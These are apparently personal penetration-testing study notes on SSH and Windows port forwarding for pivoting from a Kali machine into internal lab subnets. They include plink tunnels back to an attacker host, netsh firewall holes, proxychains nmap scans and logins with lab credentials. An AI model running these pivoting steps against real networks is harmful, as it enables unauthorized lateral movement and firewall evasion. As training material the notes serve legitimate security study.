# SSH Port Forward

## _Linux_

LHOST == listener aka tunnel start\
RHOST == "Receiver" aka tunnel end\
FHOST == TARGET we're trying to get to

### Local

!\[\[ssh\_lpf 1.jpg]]\
WAN(**LHOST**) ==== INTERNAL(**RHOST**) ----> SUB-INTERNAL(**FHOST**)

```shell

ssh -N -L LHOST:LPORT:RHOST:RPORT usern@RHOST



# 2. In Kali
# service    LPORT         LHOST
#  \/         \/            \/                    
smbclient -p 4455 -L //192.168.183.63/ -U hr_admin --password=Welcome1234
```

### Remote

_**Use if inbound ssh is filtered/closed**_

```shell
ssh -N -R 127.0.0.1:LPORT:FHOST:FPORT kali@192.168.%.%
# service access via 127.0.0.1 LPORT 
```

!\[\[Screenshot 2024-10-07 at 8.49.31 PM.png]]\
kali(**LHOST**) ==== WAN(**RHOST**) ----> INTERNAL(**FHOST**)

```shell
# 1. In Kali
#
sudo systemctl start ssh
sudo ss -tulpn



# 2. On WAN
#                   LPORT    FHOST    FPORT       LHOST    
#                    \/       \/       \/          \/
ssh -N -R 127.0.0.1:2345:10.4.232.215:5432 kali@192.168.%.%



# 3. In Kali, check using ss -tulpn for a connection
#
# Access using the 127.0.0.1:2345
psql -h 127.0.0.1 -p 2345 -U postgres
```

### sshuttle (dynamic)

_Alternate to Dynamic Port Forward and PREFERRED if we have direct access to an SSH server, behind which is a more complex internal network as classic dynamic port forwarding might be difficult to manage**REQUIRES**_

1. **root** on SSH client initiating connection,
2. **python3** on the SSH server\
   !\[\[ssh\_dpf.jpg]]WAN(**LHOST**) ==== INTERNAL(**RHOST**) ----> SMB on SUB-INTERNAL(**FHOST**)

```shell
# 1. on WAN, setup local port forward
#                            INTERNAL-with-ssh
#                                  \/
socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22



# 2. in KALI , run routing to other SUB-INTERNAL addresses:
#                                 WAN           INTERNAL     SUB-INTERNAL
#                                  \/               \/             \/
sshuttle -r database_admin@192.168.50.63:2222 10.4.50.0/24 172.16.50.0/24
#
# Access service. SMB as an example
smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234
```

### Dynamic

!\[\[ssh\_dpf.jpg]]\
WAN(**LHOST**) ==== INTERNAL(**RHOST**) ----> NMAP on SUB-INTERNAL(**FHOST**)

```shell
# 1. On WAN
#                LPORT     username     RHOST
#                  \/         \/          \/
ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215



# 2. In Kali, change proxychains config to ADD WANIP and port from above
# sudo mousepad /etc/proxychains4.conf &
#                 LPORT
#                   \/
# socks5 WANIP 9999
# nmap scan against the 172.16.232.217 FHOST
seq 4800 4900 | xargs -P 50 -I{} proxychains nmap -p {} -sT -Pn --open -n -T4 --min-parallelism 100 --min-rate 1 --oG proxychains_nmap --append-output 172.16.232.217
cat proxychains_nmap | grep -e "^Host.*open"

# box64 via proxychains
proxychains box64 ./ssh_dynamic_client -i 172.16.232.217 -p 4872

#https://www.hackwhackandsmack.com/?p=1021
```

### Remote Dynamic

!\[\[Screenshot 2024-10-07 at 8.57.59 PM.png]]\
Kali(**LHOST**) ==== WAN(**RHOST**) ----> NMAP on SUB-INTERNAL(**FHOST**)

```shell
# 1. On WAN
#
ssh -N -R 9998 kali@192.168.#.#



# 2. In Kali, proxychains config to match port from above
#
# socks5 127.0.0.1 9998

# can reach hosts now so example showing nmap
seq 9000 9100 | xargs -P 50 -I{} proxychains nmap -p {} -sT -Pn --open -n -T4 --min-parallelism 100 --min-rate 1 --oG proxychains_nmap_remote_dynamic --append-output 10.4.232.64
cat proxychains_nmap_remote_dynamic | grep -e "^Host.*open"

# box64 via proxychains
proxychains box64 ./ssh_remote_dynamic -i 10.4.232.64 -p 9062
```

## _Windows_

### ssh

Same methodologies

### Plink.exe

_**if no ssh, can use this which is putty made ssh client**_\
!\[\[Screenshot 2024-10-07 at 9.14.35 PM.png]]\
Example Remote Port Forward to get RDP access

```shell
cmd.exe /c echo y | C:\Windows\Temp\plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 KALI_IP
```

### netsh

_**Requires**_ _**ADMIN** and/or **UAC**_\
!\[\[Screenshot 2024-10-08 at 5.14.24 PM.png]]\
|| WAN ===== INTERNAL with database service

```shell
# 1. On WAN, 
# CREATE forwarder
#
netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.64 connectport=22 connectaddress=10.4.50.215
#
# CHECK forwarder was created
netstat -anp TCP | find "2222"
netsh interface portproxy show all
#
# POKE a Hole in the Windows Firewall
netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.50.64 localport=2222 action=allow



# 2. In KALI check Host is accessible
#
sudo nmap -sS 192.168.50.64 -Pn -n -p2222
#
# Access service. SSH as example
ssh database_admin@192.168.50.64 -p2222



# CLEANUP firewall rule and delete the forwarder once finished
#
netsh advfirewall firewall delete rule name="port_forward_ssh_2222"
netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.64
```
